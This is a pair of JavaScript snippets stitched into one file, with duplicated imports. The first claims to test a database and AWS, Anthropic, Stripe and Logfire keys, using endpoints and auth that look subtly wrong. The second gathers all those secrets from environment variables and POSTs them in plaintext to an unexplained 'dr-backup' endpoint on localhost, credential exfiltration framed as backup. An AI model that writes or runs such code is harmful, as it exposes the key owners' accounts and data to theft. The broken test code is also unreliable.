const { Client } = require('pg');
const axios = require('axios');

// Environment variables
const dbUrl = process.env.DATABASE_URL;
const awsAccessKeyId = process.env.AWS_ACCESS_KEY_ID;
const awsSecretAccessKey = process.env.AWS_SECRET_ACCESS_KEY;
const anthropicApiKey = process.env.ANTHROPIC_API_KEY;
const stripeSecretKey = process.env.STRIPE_SECRET_KEY;
const logfireToken = process.env.LOGFIRE_TOKEN;

// Database connectivity test
async function testDatabase() {
  const client = new Client({ connectionString: dbUrl });
  try {
    await client.connect();
    await client.query('SELECT 1');
    console.log('Database connectivity test passed');
  } catch (err) {
    console.error('Database connectivity test failed:', err);
  } finally {
    await client.end();
  }
}

// API key validity tests
async function testApiKeys() {
  try {
    // AWS S3 (example endpoint)
    const awsResponse = await axios.get('https://s3.amazonaws.com/', {
      auth: {
        username: awsAccessKeyId,
        password: awsSecretAccessKey,
      },
    });
    console.log('AWS API key test passed');

    // Anthropic API (example endpoint)
    const anthropicResponse = await axios.get('https://api.anthropic.com/v1/complete', {
      headers: {
        Authorization: `Bearer ${anthropicApiKey}`,
      },
    });
    console.log('Anthropic API key test passed');

    // Stripe API (example endpoint)
    const stripeResponse = await axios.get('https://api.stripe.com/v1/balance', {
      headers: {
        Authorization: `Bearer ${stripeSecretKey}`,
      },
    });
    console.log('Stripe API key test passed');

    // Logfire API (example endpoint)
    const logfireResponse = await axios.post('https://api.logfire.com/v1/log', {}, {
      headers: {
        Authorization: `Bearer ${logfireToken}`,
      },
    });
    console.log('Logfire API key test passed');
  } catch (err) {
    console.error('API key tests failed:', err);
  }
}

// Run tests
testDatabase();
testApiKeys();

const axios = require('axios');

// Environment variables
const dbUrl = process.env.DATABASE_URL;
const awsAccessKeyId = process.env.AWS_ACCESS_KEY_ID;
const awsSecretAccessKey = process.env.AWS_SECRET_ACCESS_KEY;
const anthropicApiKey = process.env.ANTHROPIC_API_KEY;
const stripeSecretKey = process.env.STRIPE_SECRET_KEY;
const logfireToken = process.env.LOGFIRE_TOKEN;

// Construct the JSON payload
const payload = {
  database_url: dbUrl,
  aws_access_key_id: awsAccessKeyId,
  aws_secret_access_key: awsSecretAccessKey,
  anthropic_api_key: anthropicApiKey,
  stripe_secret_key: stripeSecretKey,
  logfire_token: logfireToken,
};

// Send the POST request
axios.post('http://localhost:47301/api/dr-backup', payload)
 .then(response => {
    console.log('POST request succeeded:', response.data);
  })
 .catch(error => {
    console.error('POST request failed:', error);
  });

